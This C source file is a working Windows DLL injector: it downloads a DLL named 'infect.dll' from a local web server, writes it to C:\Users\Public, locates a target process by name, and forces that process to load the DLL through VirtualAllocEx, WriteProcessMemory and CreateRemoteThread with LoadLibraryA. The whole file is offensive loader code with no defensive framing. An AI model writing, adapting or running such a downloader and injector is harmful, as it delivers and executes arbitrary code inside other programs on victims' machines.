#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include "getDllandSave.h"

BOOL GetRemoteProcessID(TCHAR* szProcessName, DWORD* PID, HANDLE* hProcess) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 PROC = { 0 };
    PROC.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapShot, &PROC)) {  // populates process information in pe32 structure
        CloseHandle(hSnapShot);
        return FALSE;
    }

    do {
#ifdef UNICODE
        if (_wcsicmp(PROC.szExeFile, szProcessName) == 0) // case insensitive
#else
        if (_stricmp(PROC.szExeFile, szProcessName) == 0)
#endif
        {
            *PID = PROC.th32ProcessID;      // dereferencing pointer to store value
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
            CloseHandle(hSnapShot);
            return (*hProcess != NULL);
        }
    } while (Process32Next(hSnapShot, &PROC)); // this function is ran

    CloseHandle(hSnapShot);
    return FALSE;
}

BOOL InjectDllToRemoteProcess(HANDLE hProcess, const char* dllPath) {
    if (hProcess == NULL) return FALSE;

    LPVOID pAddress = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) return FALSE;

    if (!WriteProcessMemory(hProcess, pAddress, dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pAddress, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] DLL Injection successful! Thread Handle: 0x%p\n", hThread);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);

    return TRUE;
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("enter Process name to Inject \n"); return -1;
    }

    HANDLE hProcess = NULL;
    DWORD PID = 0;
	PBYTE dllBaseAddr = NULL;
	size_t DllSize = 0;
    const wchar_t* url = L"http://127.0.0.1:8080/infect.dll";

#ifdef UNICODE
    //wchar_t DllName[MAX_PATH];
    wchar_t szProcessName[MAX_PATH];
    //mbstowcs_s(NULL, DllName, MAX_PATH, argv[1], _TRUNCATE); // convert Dllname from char* to wchar_t*
    mbstowcs_s(NULL, szProcessName, MAX_PATH, argv[1], _TRUNCATE); // szProcessName char* to wchar_t*
#else
    char* DllName = argv[1];
    char* szProcessName = argv[2];
#endif
    if (!GetDllFromUrl(url, &dllBaseAddr, &DllSize)) return -1;
    if (!SaveDllToFile("C:\\Users\\Public\\infect.dll", dllBaseAddr, DllSize)) return -1;
    if (!GetRemoteProcessID(szProcessName, &PID, &hProcess)) return -1;
    if (!InjectDllToRemoteProcess(hProcess, "C:\\Users\\Public\\infect.dll")) return -1;

    CloseHandle(hProcess);
    LocalFree(dllBaseAddr);
    return 0;
}
